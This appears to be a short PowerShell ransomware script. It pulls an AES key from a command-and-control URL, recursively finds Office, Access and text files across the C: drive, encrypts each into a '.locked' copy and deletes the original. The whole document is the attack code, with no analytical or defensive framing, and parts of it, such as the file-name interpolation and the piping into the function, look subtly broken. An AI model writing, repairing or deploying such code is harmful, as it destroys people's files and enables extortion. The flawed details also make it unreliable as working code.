function lock
{
$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$aes.Key = $key.key; $aes.IV = $key.iv
$inputStream = New-Object System.IO.FileStream($args[0], [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
$outputStream = New-Object System.IO.FileStream("$args[0].locked", [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
$buffer = New-Object byte[](1024)
while (($read = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0)
{
    $cryptoStream.Write($buffer, 0, $read)
}
$cryptoStream.Dispose()
$outputStream.Dispose()
$inputStream.Dispose()
$aes.Dispose()
Remove-Item $args[0]
}
$key = Invoke-RestMethod -Uri "https://cnc.mystuff.com/key/" -Method Get;
gci c:\ -r | ? {$_.extension -match '^(xls|doc)x|mdb|txt'} | lock
